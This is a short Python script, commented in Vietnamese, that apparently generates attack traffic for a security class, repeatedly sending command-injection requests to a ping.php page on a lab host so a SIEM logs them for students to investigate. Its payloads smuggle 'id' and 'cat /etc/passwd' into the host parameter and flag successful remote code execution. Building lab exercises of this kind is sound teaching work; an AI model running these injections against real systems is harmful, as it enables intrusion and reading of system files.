#!/usr/bin/env python3
# Tan cong tu dong: command injection vao ping.php tren 'targeta' (he A).
# Lien tuc ban de SIEM ghi nhan + de SV co gi ma dieu tra/va.
import urllib.request
import urllib.parse
import time

TARGET = "http://targeta"

PAYLOADS = [
    "/ping.php?host=127.0.0.1",                      # hop le (de so sanh)
    "/ping.php?host=127.0.0.1;id",                   # command injection
    "/ping.php?host=127.0.0.1;cat /etc/passwd",      # doc file
    "/ping.php?host=127.0.0.1|id",                   # bien the pipe
]


def req(path):
    url = TARGET + urllib.parse.quote(path, safe=":/?=&")
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, str(e)


for _ in range(60):
    code, _b = req("/ping.php?host=127.0.0.1")
    if code:
        break
    time.sleep(2)

while True:
    for p in PAYLOADS:
        code, body = req(p)
        hit = "uid=" in body
        print(time.strftime("%Y-%m-%d %H:%M:%S"), "HTTP", code, "RCE" if hit else "   ", p, flush=True)
    time.sleep(15)
